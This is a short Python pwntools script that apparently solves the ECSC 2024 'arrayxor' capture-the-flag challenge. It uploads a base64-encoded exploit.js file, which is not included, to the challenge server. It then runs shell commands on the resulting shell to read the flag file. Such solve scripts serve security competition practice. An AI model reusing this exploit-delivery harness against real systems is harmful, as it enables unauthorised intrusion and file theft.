#!/usr/bin/env python3
from pwn import *
import logging
import os
from base64 import b64encode

logging.disable()

HOST = os.environ.get("HOST", "arrayxor.challs.open.ecsc2024.it")
PORT = int(os.environ.get("PORT", 38020))

with open(os.path.dirname(os.path.abspath(__file__)) + "/exploit.js", "rb") as f:
    expl = f.read()

expl = b64encode(expl)

r = remote(HOST, PORT)
r.sendlineafter(b"Result:", f"redacted".encode())
r.sendlineafter(b"newline\n", expl)

time.sleep(1)

r.sendline(b"id")
r.sendline(b"cat /home/user/flag")
r.sendline(b"exit")
print(r.recvall().decode())
r.close()